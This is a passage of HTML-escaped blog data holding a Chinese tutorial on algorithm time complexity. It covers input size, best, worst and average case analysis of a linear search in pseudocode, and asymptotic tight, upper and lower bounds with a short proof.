x662F;&#x4E00;&#x4E2A;&#x91CF;&#x7EA7;&#x7684;&#x3002;</p>\n<p>&#x4E8E;&#x662F;&#x7ED9;&#x51FA;&#x5982;&#x4E0B;&#x5B9A;&#x4E49;&#xFF1A;&#x8BBE;F(n)&#x4E3A;&#x7B97;&#x6CD5;A&#x5728;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x4E0B;F(n)&#xFF0C;&#x5219;&#x5982;&#x679C;F(n)&#x5C5E;&#x4E8E;&#x398;(g(n))&#xFF0C;&#x5219;&#x8BF4;&#x7B97;&#x6CD5;A&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4E3A;g(n)&#xFF0C;&#x4E14;g(n)&#x4E3A;F(n)&#x7684;&#x6E10;&#x8FD1;&#x786E;&#x754C;&#x3002;</p>\n<p>&#x8FD8;&#x662F;&#x4EE5;&#x4E0A;&#x9762;&#x7684;&#x4F8B;&#x5B50;&#x4E3A;&#x4F8B;&#xFF0C;&#x5219;&#x5728;&#x4E0A;&#x9762;&#x5B9A;&#x4E49;&#x4E2D;F(n) = (t1+t2)*n+t3&#x3002;&#x5219;F(n)&#x7684;&#x6E10;&#x8FD1;&#x786E;&#x754C;&#x4E3A;n&#xFF0C;&#x5176;&#x8BC1;&#x660E;&#x5982;&#x4E0B;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x8BC1;&#x660E;&#xFF1A;</span><br><span class=\"line\">&#x8BBE;c1=t1+t2&#xFF0C;c2=t1+t2+t3&#xFF0C;n0=2</span><br><span class=\"line\">&#x53C8;&#x56E0;&#x4E3A; t1,t2,t3&#x5747;&#x5927;&#x4E8E;0</span><br><span class=\"line\">&#x5219;&#xFF0C;&#x5F53;n&gt;n0&#x65F6;&#xFF0C;0&lt;c1n&lt;=F(n)&lt;=c2n &#x5373; 0&lt;(t1+t2)*n&lt;=(t1+t2)*n+t3&lt;=(t1+t2+t3)*n&#x6052;&#x6210;&#x7ACB;&#x3002;</span><br><span class=\"line\">&#x6240;&#x4EE5; F(n)&#x5C5E;&#x4E8E;&#x398;(n)</span><br><span class=\"line\">&#x6240;&#x4EE5; n&#x662F;F(n)&#x7684;&#x6E10;&#x8FD1;&#x786E;&#x754C;</span><br><span class=\"line\">&#x8BC1;&#x6BD5;</span><br></pre></td></tr></table></figure></p>\n<p><font style=\"color:red;\">&#x5728;&#x5B9E;&#x9645;&#x5E94;&#x7528;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x4E00;&#x822C;&#x90FD;&#x662F;&#x4F7F;&#x7528;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4EE3;&#x66FF;&#x5B9E;&#x9645;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x6765;&#x8FDB;&#x884C;&#x7B97;&#x6CD5;&#x6548;&#x7387;&#x5206;&#x6790;&#x3002;</font>&#x4E00;&#x822C;&#x8BA4;&#x4E3A;&#xFF0C;&#x4E00;&#x4E2A;&#x6E10;&#x8FD1;&#x590D;&#x6742;&#x5EA6;&#x4E3A;n&#x7684;&#x7B97;&#x6CD5;&#x8981;&#x4F18;&#x4E8E;&#x6E10;&#x8FD1;&#x590D;&#x6742;&#x5EA6;&#x4E3A;n^2&#x7684;&#x7B97;&#x6CD5;&#x3002;</p>\n<p>&#x6CE8;&#x610F;&#xFF0C;&#x8FD9;&#x5E76;&#x4E0D;&#x662F;&#x8BF4;&#x6E10;&#x8FD1;&#x590D;&#x6742;&#x5EA6;&#x4E3A;n&#x7684;&#x7B97;&#x6CD5;&#x5728;&#x4EFB;&#x4F55;&#x60C5;&#x51B5;&#x4E0B;&#x90FD;&#x4E00;&#x5B9A;&#x66F4;&#x9AD8;&#x6548;&#xFF0C;&#x800C;&#x662F;&#x8BF4;&#x5728;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x8DB3;&#x591F;&#x5927;&#x540E;&#xFF08;&#x5927;&#x4E8E;&#x4E34;&#x754C;&#x6761;&#x4EF6;n0&#xFF09;&#xFF0C;&#x5219;&#x524D;&#x4E00;&#x4E2A;&#x7B97;&#x6CD5;&#x7684;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x603B;&#x662F;&#x597D;&#x4E8E;&#x540E;&#x4E00;&#x4E2A;&#x7B97;&#x6CD5;&#x7684;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x3002;&#x4E8B;&#x5B9E;&#x8BC1;&#x660E;&#xFF0C;&#x5728;&#x5B9E;&#x8DF5;&#x4E2D;&#x8FD9;&#x79CD;&#x5206;&#x6790;&#x662F;&#x5408;&#x7406;&#x4E14;&#x6709;&#x6548;&#x7684;&#x3002;</p>\n<p>&#x7C7B;&#x4F3C;&#x7684;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x7ED9;&#x51FA;&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x7684;&#x4E0A;&#x786E;&#x754C;&#x548C;&#x4E0B;&#x786E;&#x754C; &#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x8BBE;F(n)&#x4E3A;&#x7B97;&#x6CD5;A&#x5728;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x4E0B;F(n)&#xFF0C;&#x5219;&#x5982;&#x679C;F(n)&#x5C5E;&#x4E8E;&#x39F;(g(n))&#xFF0C;&#x5219;&#x8BF4;&#x7B97;&#x6CD5;A&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4E0A;&#x9650;&#x4E3A;g(n)&#xFF0C;&#x4E14;g(n)&#x4E3A;F(n)&#x7684;&#x6E10;&#x8FD1;&#x4E0A;&#x786E;&#x754C;&#x3002;</span><br><span class=\"line\">&#x8BBE;F(n)&#x4E3A;&#x7B97;&#x6CD5;A&#x5728;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x4E0B;F(n)&#xFF0C;&#x5219;&#x5982;&#x679C;F(n)&#x5C5E;&#x4E8E;&#x3A9;(g(n))&#xFF0C;&#x5219;&#x8BF4;&#x7B97;&#x6CD5;A&#x7684;&#x6E10;&#x8FD1;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x4E0B;&#x9650;&#x4E3A;g(n)&#xFF0C;&#x4E14;g(n)&#x4E3A;F(n)&#x7684;&#x6E10;&#x8FD1;&#x4E0B;&#x786E;&#x754C;&#x3002;</span><br></pre></td></tr></table></figure></p>\n<p>&#x8FD9;&#x91CC;&#x4E00;&#x5B9A;&#x8981;&#x6CE8;&#x610F;&#xFF0C;&#x7531;&#x4E8E;&#x6211;&#x4EEC;&#x662F;&#x4EE5;F(n)&#x6700;&#x574F;&#x60C5;&#x51B5;&#x5206;&#x6790;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;100%&#x4FDD;&#x8BC1;&#x5728;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x8D85;&#x8FC7;&#x4E34;&#x754C;&#x6761;&#x4EF6;n0&#x65F6;&#xFF0C;&#x7B97;&#x6CD5;&#x7684;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x4E00;&#x5B9A;&#x4E0D;&#x4F1A;&#x9AD8;&#x4E8E;&#x6E10;&#x8FD1;&#x4E0A;&#x786E;&#x754C;&#xFF0C;&#x4F46;&#x662F;&#x5E76;&#x4E0D;&#x80FD;100%&#x4FDD;&#x8BC1;&#x7B97;&#x6CD5;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x4E0D;&#x4F1A;&#x4F4E;&#x4E8E;&#x6E10;&#x8FD1;&#x4E0B;&#x786E;&#x754C;&#xFF0C;&#x800C;&#x53EA;&#x80FD;100%&#x4FDD;&#x8BC1;&#x7B97;&#x6CD5;&#x7684;&#x6700;&#x574F;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x4E0D;&#x4F1A;&#x4F4E;&#x4E8E;&#x6E10;&#x8FD1;&#x4E0B;&#x786E;&#x754C;&#x3002;</p>\n<hr>\n<h3 id=\"&#x76F8;&#x5173;&#x94FE;&#x63A5;\"><a href=\"#&#x76F8;&#x5173;&#x94FE;&#x63A5;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x94FE;&#x63A5;\"></a>&#x76F8;&#x5173;&#x94FE;&#x63A5;</h3><p>&#x7B97;&#x6CD5;&#x7684;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x548C;&#x7A7A;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x603B;&#x7ED3;&#xFF1A;<a href=\"http://blog.csdn.net/zolalad/article/details/11848739\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/zolalad/article/details/11848739</a></p>\n","excerpt":"","more":"<h3 id=\"&#x524D;&#x8A00;\"><a href=\"#&#x524D;&#x8A00;\" class=\"headerlink\" title=\"&#x524D;&#x8A00;\"></a>&#x524D;&#x8A00;</h3><p>&#x901A;&#x5E38;&#xFF0C;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x7ED9;&#x5B9A;&#x7684;&#x7B97;&#x6CD5;&#xFF0C;&#x6211;&#x4EEC;&#x8981;&#x505A;&#x4E24;&#x9879;&#x5206;&#x6790;&#x3002;<font style=\"color:red;\">&#x7B2C;&#x4E00;&#x662F;&#x4ECE;&#x6570;&#x5B66;&#x4E0A;&#x8BC1;&#x660E;&#x7B97;&#x6CD5;&#x7684;&#x6B63;&#x786E;&#x6027;</font>&#xFF0C;&#x8FD9;&#x4E00;&#x6B65;&#x4E3B;&#x8981;&#x7528;&#x5230;&#x5F62;&#x5F0F;&#x5316;&#x8BC1;&#x660E;&#x7684;&#x65B9;&#x6CD5;&#x53CA;&#x76F8;&#x5173;&#x63A8;&#x7406;&#x6A21;&#x5F0F;&#xFF0C;&#x5982;&#x5FAA;&#x73AF;&#x4E0D;&#x53D8;&#x5F0F;&#x3001;&#x6570;&#x5B66;&#x5F52;&#x7EB3;&#x6CD5;&#x7B49;&#x3002;&#x800C;&#x5728;&#x8BC1;&#x660E;&#x7B97;&#x6CD5;&#x662F;&#x6B63;&#x786E;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;<font style=\"color:red;\">&#x7B2C;&#x4E8C;&#x5C31;&#x662F;&#x5206;&#x6790;&#x7B97;&#x6CD5;&#x7684;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x3002;</font>&#x7B97;&#x6CD5;&#x7684;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x53CD;&#x6620;&#x4E86;&#x7A0B;&#x5E8F;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x968F;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x589E;&#x957F;&#x800C;&#x589E;&#x957F;&#x7684;&#x91CF;&#x7EA7;&#xFF0C;&#x5728;&#x5F88;&#x5927;&#x7A0B;&#x5EA6;&#x4E0A;&#x80FD;&#x5F88;&#x597D;&#x53CD;&#x6620;&#x51FA;&#x7B97;&#x6CD5;&#x7684;&#x4F18;&#x52A3;&#x4E0E;&#x5426;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x4F5C;&#x4E3A;&#x7A0B;&#x5E8F;&#x5458;&#xFF0C;&#x638C;&#x63E1;&#x57FA;&#x672C;&#x7684;&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x5206;&#x6790;&#x65B9;&#x6CD5;&#x662F;&#x5F88;&#x6709;&#x5FC5;&#x8981;&#x7684;&#x3002;</p>\n<p>&#x4F46;&#x662F;&#x5F88;&#x591A;&#x670B;&#x53CB;&#x5E76;&#x4E0D;&#x80FD;&#x6E05;&#x6670;&#x7684;&#x7406;&#x89E3;&#x8FD9;&#x4E00;&#x6982;&#x5FF5;&#xFF0C;&#x7A76;&#x5176;&#x539F;&#x56E0;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x56E0;&#x4E3A;&#x6CA1;&#x6709;&#x4ECE;&#x6570;&#x5B66;&#x5C42;&#x9762;&#x4E0A;&#x7406;&#x89E3;&#x5176;&#x672C;&#x8D28;&#xFF0C;&#x800C;&#x662F;&#x4E60;&#x60EF;&#x4E8E;&#x4ECE;&#x76F4;&#x89C2;&#x7406;&#x89E3;&#x3002;&#x4E0B;&#x9762;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x4E00;&#x6B65;&#x6B65;&#x8D70;&#x8FD1;&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x7684;&#x6570;&#x5B66;&#x672C;&#x8D28;&#x3002;</p>\n<hr>\n<h3 id=\"&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x7684;&#x6570;&#x5B66;&#x610F;&#x4E49;\"><a href=\"#&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x7684;&#x6570;&#x5B66;&#x610F;&#x4E49;\" class=\"headerlink\" title=\"&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x7684;&#x6570;&#x5B66;&#x610F;&#x4E49;\"></a>&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x7684;&#x6570;&#x5B66;&#x610F;&#x4E49;</h3><p><strong>&#x4ECE;&#x6570;&#x5B66;&#x4E0A;&#x5B9A;&#x4E49;&#xFF0C;&#x7ED9;&#x5B9A;&#x7B97;&#x6CD5;A&#xFF0C;&#x5982;&#x679C;&#x5B58;&#x5728;&#x51FD;&#x6570;F(n)&#xFF0C;&#x5F53;n=k&#x65F6;&#xFF0C;F(k)&#x8868;&#x793A;&#x7B97;&#x6CD5;A&#x5728;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x4E3A;k&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x7684;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#xFF0C;&#x5219;&#x79F0;F(n)&#x4E3A;&#x7B97;&#x6CD5;A&#x7684;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x3002;</strong></p>\n<blockquote>\n<p>&#x53E6;&#x4E00;&#x79CD;&#x5B9A;&#x4E49;&#xFF1A;<br>&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7B97;&#x6CD5;&#x4E2D;&#x57FA;&#x672C;&#x64CD;&#x4F5C;&#x91CD;&#x590D;&#x6267;&#x884C;&#x7684;&#x6B21;&#x6570;&#x662F;&#x95EE;&#x9898;&#x89C4;&#x6A21;n&#x7684;&#x67D0;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x7528;T(n)&#x8868;&#x793A;&#xFF0C;&#x82E5;&#x6709;&#x67D0;&#x4E2A;&#x8F85;&#x52A9;&#x51FD;&#x6570;f(n)&#xFF0C;&#x4F7F;&#x5F97;&#x5F53;n&#x8D8B;&#x8FD1;&#x4E8E;&#x65E0;&#x7A77;&#x5927;&#x65F6;&#xFF0C;T(n)/f(n)&#x7684;&#x6781;&#x9650;&#x503C;&#x4E3A;&#x4E0D;&#x7B49;&#x4E8E;&#x96F6;&#x7684;&#x5E38;&#x6570;&#xFF0C;&#x5219;&#x79F0;f(n)&#x662F;T(n)&#x7684;&#x540C;&#x6570;&#x91CF;&#x7EA7;&#x51FD;&#x6570;&#x3002;&#x8BB0;&#x4F5C;T(n)=O(f(n))&#xFF0C;&#x79F0;O(f(n))&#x4E3A;&#x7B97;&#x6CD5;&#x7684;&#x6E10;&#x8FDB;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;(O&#x662F;&#x6570;&#x91CF;&#x7EA7;&#x7684;&#x7B26;&#x53F7; )&#xFF0C;&#x7B80;&#x79F0;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x3002;</p>\n</blockquote>\n<p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x9996;&#x5148;&#x8981;&#x660E;&#x786E;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x7684;&#x6982;&#x5FF5;&#x3002;&#x5173;&#x4E8E;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#xFF0C;&#x4E0D;&#x662F;&#x5F88;&#x597D;&#x4E0B;&#x5B9A;&#x4E49;&#xFF0C;&#x975E;&#x4E25;&#x683C;&#x7684;&#x8BB2;&#xFF0C;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x662F;&#x6307;&#x7B97;&#x6CD5;A&#x6240;&#x63A5;&#x53D7;&#x8F93;&#x5165;&#x7684;&#x81EA;&#x7136;&#x72EC;&#x7ACB;&#x4F53;&#x7684;&#x5927;&#x5C0F;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x5BF9;&#x4E8E;&#x6392;&#x5E8F;&#x7B97;&#x6CD5;&#x6765;&#x8BF4;&#xFF0C;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x4E00;&#x822C;&#x5C31;&#x662F;&#x5F85;&#x6392;&#x5E8F;&#x5143;&#x7D20;&#x7684;&#x4E2A;&#x6570;&#xFF0C;&#x800C;&#x5BF9;&#x4E8E;&#x6C42;&#x4E24;&#x4E2A;&#x540C;&#x578B;&#x65B9;&#x9635;&#x4E58;&#x79EF;&#x7684;&#x7B97;&#x6CD5;&#xFF0C;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x53EF;&#x4EE5;&#x770B;&#x4F5C;&#x662F;&#x5355;&#x4E2A;&#x65B9;&#x9635;&#x7684;&#x7EF4;&#x6570;&#x3002;&#x4E3A;&#x4E86;&#x7B80;&#x5355;&#x8D77;&#x89C1;&#xFF0C;&#x5728;&#x4E0B;&#x9762;&#x7684;&#x8BA8;&#x8BBA;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x603B;&#x662F;&#x5047;&#x8BBE;&#x7B97;&#x6CD5;&#x7684;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x662F;&#x7528;&#x5927;&#x4E8E;&#x96F6;&#x7684;&#x6574;&#x6570;&#x8868;&#x793A;&#x7684;&#xFF0C;&#x5373;n=1,2,3,&#x2026;&#x2026;,k,&#x2026;&#x2026;</p>\n<p>&#x6211;&#x4EEC;&#x8FD8;&#x77E5;&#x9053;&#xFF0C;&#x5BF9;&#x4E8E;&#x540C;&#x4E00;&#x4E2A;&#x7B97;&#x6CD5;&#xFF0C;&#x6BCF;&#x6B21;&#x6267;&#x884C;&#x7684;&#x65F6;&#x95F4;&#x4E0D;&#x4EC5;&#x53D6;&#x51B3;&#x4E8E;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#xFF0C;&#x8FD8;&#x53D6;&#x51B3;&#x4E8E;&#x8F93;&#x5165;&#x7684;&#x7279;&#x6027;&#x548C;&#x5177;&#x4F53;&#x7684;&#x786C;&#x4EF6;&#x73AF;&#x5883;&#x5728;&#x67D0;&#x6B21;&#x6267;&#x884C;&#x65F6;&#x7684;&#x72B6;&#x6001;&#x3002;&#x6240;&#x4EE5;&#x60F3;&#x8981;&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x7EDF;&#x4E00;&#x7CBE;&#x786E;&#x7684;F(n)&#x662F;&#x4E0D;&#x53EF;&#x80FD;&#x7684;&#x3002;&#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x505A;&#x4E00;&#x4E0B;&#x4E24;&#x4E2A;&#x8BF4;&#x660E;&#xFF1A;<br>1.&#x5FFD;&#x7565;&#x786C;&#x4EF6;&#x53CA;&#x73AF;&#x5883;&#x56E0;&#x7D20;&#xFF0C;&#x5047;&#x8BBE;&#x6BCF;&#x6B21;&#x6267;&#x884C;&#x65F6;&#x786C;&#x4EF6;&#x6761;&#x4EF6;&#x548C;&#x73AF;&#x5883;&#x6761;&#x4EF6;&#x662F;&#x5B8C;&#x5168;&#x4E00;&#x81F4;&#x7684;&#x3002;<br>2.&#x5BF9;&#x4E8E;&#x8F93;&#x5165;&#x7279;&#x6027;&#x7684;&#x5DEE;&#x5F02;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x4ECE;&#x6570;&#x5B66;&#x4E0A;&#x8FDB;&#x884C;&#x7CBE;&#x786E;&#x5206;&#x6790;&#x5E76;&#x5E26;&#x5165;&#x51FD;&#x6570;&#x89E3;&#x6790;&#x5F0F;&#x3002;</p>\n<hr>\n<h3 id=\"&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x5206;&#x6790;&#x793A;&#x4F8B;\"><a href=\"#&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x5206;&#x6790;&#x793A;&#x4F8B;\" class=\"headerlink\" title=\"&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x5206;&#x6790;&#x793A;&#x4F8B;\"></a>&#x7B97;&#x6CD5;&#x65F6;&#x95F4;&#x590D;&#x6742;&#x5EA6;&#x5206;&#x6790;&#x793A;&#x4F8B;</h3><p>&#x4E3A;&#x4E86;&#x4FBF;&#x4E8E;&#x670B;&#x53CB;&#x4EEC;&#x7406;&#x89E3;&#xFF0C;&#x6211;&#x5C06;&#x4E0D;&#x4F1A;&#x91C7;&#x7528;&#x6559;&#x79D1;&#x4E66;&#x4E0A;&#x60EF;&#x7528;&#x7684;&#x5FEB;&#x901F;&#x6392;&#x5E8F;&#x3001;&#x5408;&#x5E76;&#x6392;&#x5E8F;&#x7B49;&#x7ECF;&#x5178;&#x793A;&#x4F8B;&#x8FDB;&#x884C;&#x5206;&#x6790;&#xFF0C;&#x800C;&#x662F;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x5341;&#x5206;&#x7B80;&#x5355;&#x7684;&#x7B97;&#x6CD5;&#x4F5C;&#x4E3A;&#x793A;&#x4F8B;&#x3002;&#x6211;&#x4EEC;&#x5148;&#x6765;&#x5B9A;&#x4E49;&#x95EE;&#x9898;&#x3002;</p>\n<p>&#x95EE;&#x9898;&#x5B9A;&#x4E49;&#xFF1A;<br>&#x8F93;&#x5165;&#x2014;&#x2014;&#x6B64;&#x95EE;&#x9898;&#x8F93;&#x5165;&#x4E3A;&#x4E00;&#x4E2A;&#x6709;&#x5E8F;&#x5E8F;&#x5217;&#xFF0C;&#x5176;&#x5143;&#x7D20;&#x4E2A;&#x6570;&#x4E3A;n&#xFF0C;n&#x4E3A;&#x5927;&#x4E8E;&#x96F6;&#x7684;&#x6574;&#x6570;&#x3002;&#x5E8F;&#x5217;&#x4E2D;&#x7684;&#x5143;&#x7D20;&#x4E3A;&#x4ECE;1&#x5230;n&#x8FD9;n&#x4E2A;&#x6574;&#x6570;&#xFF0C;&#x4F46;&#x5176;&#x987A;&#x5E8F;&#x4E3A;&#x5B8C;&#x5168;&#x968F;&#x673A;&#x3002;<br>&#x8F93;&#x51FA;&#x2014;&#x2014;&#x5143;&#x7D20;n&#x6240;&#x5728;&#x7684;&#x4F4D;&#x7F6E;&#x3002;&#xFF08;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x4F4D;&#x7F6E;&#x4E3A;1&#xFF09;</p>\n<p>&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;&#x4E0B;&#x9762;&#x76F4;&#x63A5;&#x7ED9;&#x51FA;&#x5176;&#x89E3;&#x51B3;&#x7B97;&#x6CD5;&#x4E4B;&#x4E00;&#xFF08;&#x4F2A;&#x4EE3;&#x7801;&#xFF09;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LocationN(A)</span><br><span class=\"line\">{</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i=1;i&lt;=n;i++)-----------------------t1</span><br><span class=\"line\">    {</span><br><span class=\"line\">          <span class=\"keyword\">if</span>(A[i] == n) ----------------------------t2</span><br><span class=\"line\">                { <span class=\"built_in\">return</span> i; }------------------------t3</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<p>&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;&#x8FD9;&#x4E2A;&#x7B97;&#x6CD5;&#x3002;&#x5176;&#x4E2D;t1&#x3001;t2&#x548C;t3&#x5206;&#x522B;&#x8868;&#x793A;&#x6B64;&#x884C;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x9700;&#x8981;&#x7684;&#x65F6;&#x95F4;&#x3002;</p>\n<p>&#x9996;&#x5148;&#xFF0C;&#x8F93;&#x5165;&#x89C4;&#x6A21;n&#x662F;&#x5F71;&#x54CD;&#x7B97;&#x6CD5;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x7684;&#x56E0;&#x7D20;&#x4E4B;&#x4E00;&#x3002;&#x5728;n&#x56FA;&#x5B9A;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x8F93;&#x5165;&#x5E8F;&#x5217;&#x4E5F;&#x4F1A;&#x5F71;&#x54CD;&#x5176;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x3002;&#x6700;&#x597D;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;n&#x5C31;&#x6392;&#x5728;&#x5E8F;&#x5217;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x4F4D;&#x7F6E;&#xFF0C;&#x90A3;&#x4E48;&#x6B64;&#x65F6;&#x7684;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x4E3A;&#x201C;t1+t2+t3&#x201D;&#x3002;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;n&#x6392;&#x5728;&#x5E8F;&#x5217;&#x6700;&#x540E;&#x4E00;&#x4F4D;&#xFF0C;&#x5219;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x4E3A;&#x201C;n<em>t1+n</em>t2+t3=(t1+t2)*n+t3&#x201D;&#x3002;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x6700;&#x597D;&#x60C5;&#x51B5;&#x4E0B;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x662F;&#x4E00;&#x4E2A;&#x5E38;&#x6570;&#xFF0C;&#x800C;&#x6700;&#x574F;&#x60C5;&#x51B5;&#x4E0B;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x662F;&#x8F93;&#x5165;&#x89C4;&#x6A21;&#x7684;&#x7EBF;&#x6027;&#x51FD;&#x6570;&#x3002;&#x90A3;&#x4E48;&#xFF0C;&#x5E73;&#x5747;&#x60C5;&#x51B5;&#x5982;&#x4F55;&#x5462;&#xFF1F;</p>\n<p>&#x95EE;&#x9898;&#x5B9A;&#x4E49;&#x8BF4;&#x8F93;&#x5165;&#x5E8F;&#x5217;&#x5B8C;&#x5168;&#x968F;&#x673A;&#xFF0C;&#x5373;n&#x51FA;&#x73B0;&#x5728;1&#x2026;n&#x8FD9;n&#x4E2A;&#x4F4D;&#x7F6E;&#x4E0A;&#x662F;&#x7B49;&#x53EF;&#x80FD;&#x7684;&#xFF0C;&#x5373;&#x6982;&#x7387;&#x5747;&#x4E3A;1/n&#x3002;&#x800C;&#x5E73;&#x5747;&#x60C5;&#x51B5;&#x4E0B;&#x7684;&#x6267;&#x884C;&#x6B21;&#x6570;&#x5373;&#x4E3A;&#x6267;&#x884C;&#x6B21;&#x6570;&#x7684;&#x6570;&#x5B66;&#x671F;&#x671B;&#xFF0C;&#x5176;&#x89E3;&#x4E3A;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">E</span><br><span class=\"line\">= p(n=1)*1+p(n=2)*2+...+p(n=n)*n</span><br><span class=\"line\">= (1/n)*(1+2+...+n)</span><br><span class=\"line\">= (1/n)*((n/2)*(1+n))</span><br><span class=\"line\">= (n+1)/2</span><br></pre></td></tr></table></figure></p>\n<p>&#x5373;&#x5728;&#x5E73;&#x5747;&#x60C5;&#x51B5;&#x4E0B;for&#x5FAA;&#x73AF;&#x8981;&#x6267;&#x884C;(n+1)/2&#x6B21;&#xFF0C;&#x5219;&#x5E73;&#x5747;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x4E3A;&#x201C;(t1+t2)<em>(n+1)/2+t3&#x201D;&#x3002;<br>&#x7531;&#x6B64;&#x6211;&#x4EEC;&#x5F97;&#x51FA;&#x5206;&#x6790;&#x7ED3;&#x8BBA;&#xFF1A;<br>**t1+t2+t3 &lt;= F(n) &lt;= 